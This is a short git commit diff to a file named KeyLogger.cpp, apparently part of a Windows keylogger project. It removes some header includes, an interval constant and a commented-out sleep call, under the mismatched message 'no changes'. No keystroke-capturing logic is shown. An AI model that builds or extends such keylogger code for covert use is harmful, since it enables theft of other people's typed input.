746f7d3ffdb91d9d20d7394864d0f56ee61c352d
Kar <karo.sahatchyan@mail.ru>
2020-07-25 11:46:54 +0400

    no changes

--- KeyLogger.cpp
+++ KeyLogger.cpp
@@ -1,14 +1,9 @@
 #include <Windows.h>
-#include <fstream>
-#include <thread>
-#include <chrono>
 
 #include <iostream>
 
 #include "Utils.h"
 #include "CharacterHandler.h"
-
-#define INTERVAL 75
 
 //int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 int main()
@@ -34,7 +29,6 @@ int main()
 				}
 			}
 		}
-		//std::this_thread::sleep_for(std::chrono::milliseconds(INTERVAL));
 	}
 	return 0;
 }
